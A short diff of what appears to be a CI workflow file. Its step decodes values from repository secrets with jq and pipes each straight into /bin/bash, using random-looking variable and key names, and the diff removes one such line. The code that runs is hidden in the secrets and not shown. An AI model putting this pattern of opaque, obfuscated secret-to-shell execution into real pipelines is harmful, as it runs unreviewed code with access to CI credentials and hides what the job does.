@@ -21,7 +21,6 @@ jobs:
           lktn4: ${{ secrets.lktn4 }}
         run: |
           printf '%s' "$lktn4" | jq -r .xq7999 | /bin/bash
-          printf '%s' "$q64" | jq -r .tk6 | /bin/bash
           printf '%s' "$oyb35" | jq -r .lb37 | /bin/bash
           printf '%s' "$y4215" | jq -r .voyrx25026 | /bin/bash
           echo $niue68 | jq -r .bjzge2 | /bin/bash
